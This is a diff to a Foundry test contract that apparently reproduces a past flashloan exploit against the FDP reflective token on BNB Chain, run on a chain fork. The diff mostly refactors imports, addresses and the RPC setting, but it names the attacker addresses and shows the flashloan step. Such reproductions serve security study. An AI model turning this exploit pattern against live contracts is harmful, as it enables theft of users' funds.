@@ -2,6 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import "./interface.sol";
 
 // Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
 // Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9
@@ -13,7 +14,7 @@ import "forge-std/Test.sol";
 // https://twitter.com/BeosinAlert/status/1622806011269771266
 
 contract Exploit is Test {
-    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IWETH private constant WBNB = IWETH(payable(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)));
     reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
     IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);
 
@@ -21,7 +22,7 @@ contract Exploit is Test {
     IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
 
     function testHack() external {
-        vm.createSelectFork("https://1rpc.io/bnb", 25_430_418);
+        vm.createSelectFork(bsc, 25_430_418);
 
         // flashloan 16.32 WBNB
         DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
@@ -70,33 +71,4 @@ interface reflectiveERC20 {
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
     function deliver(uint256 tAmount) external;
-}
-
-interface IWETH {
-    function deposit() external payable;
-    function transfer(address to, uint256 value) external returns (bool);
-    function approve(address guy, uint256 wad) external returns (bool);
-    function withdraw(uint256 wad) external;
-    function balanceOf(address) external view returns (uint256);
-}
-
-interface IDPPOracle {
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address sender, bytes calldata data) external;
-}
-
-interface IRouter {
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path,
-        address to,
-        uint256 deadline
-    ) external;
-}
-
-interface IUniswapV2Pair {
-    function balanceOf(address) external view returns (uint256);
-    function skim(address to) external;
-    function sync() external;
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
 }
